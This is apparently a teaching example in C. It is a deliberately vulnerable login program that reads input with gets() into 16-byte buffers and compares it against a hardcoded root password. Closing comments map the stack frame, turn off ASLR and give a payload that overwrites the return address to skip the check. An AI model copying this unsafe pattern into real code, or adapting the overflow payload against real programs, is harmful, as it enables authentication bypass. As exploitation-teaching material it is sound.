/*
 * Copyright (c) 2017, Stephen Warren
 *
 * Permission is hereby granted, free of charge, to any person obtaining a
 * copy of this software and associated documentation files (the "Software"),
 * to deal in the Software without restriction, including without limitation
 * the rights to use, copy, modify, merge, publish, distribute, sublicense,
 * and/or sell copies of the Software, and to permit persons to whom the
 * Software is furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL
 * THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
 * FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
 * DEALINGS IN THE SOFTWARE.
 */

#include <stdio.h>
#include <string.h>

#define USER "root"
#define PASS "hSWo,yWfQ6js*r~D"

int check_authorization(void) {
    char user[16];
    char pass[16];

    printf("username: ");
    fflush(stdout);
    gets(user);

    printf("password: ");
    fflush(stdout);
    gets(pass);

    return (!strcmp(user, USER) && !strcmp(pass, PASS));
}

void do_auth_ok(void) {
    printf("You're in\n");
}

void do_auth_fail(void) {
    printf("ACCESS DENIED!\n");
}

int main(int argc, char **argv) {
    if (check_authorization())
        do_auth_ok();
    else
        do_auth_fail();

    return 0;
}

/*
check_authorization() stack frame:
var     offset size
return      40    8
frame ptr   32    8
user[]      16   16
pass[]       0   16  <-- stack pointer
*/
/*
$ nm stack-ret|grep -e do_auth -e main
000000000040072b T do_auth_fail
000000000040071a T do_auth_ok
000000000040073c T main

$ echo -ne foo\\nbar\n | ./stack-ret 
username: password: ACCESS DENIED!

$ sudo sh -c 'echo "0" > /proc/sys/kernel/randomize_va_space'
$ echo -ne 0123456789abcdef01234567\\x1a\\x07\\x40\\n\\n | ./stack-ret 
username: password: You're in
Segmentation fault (core dumped)
*/
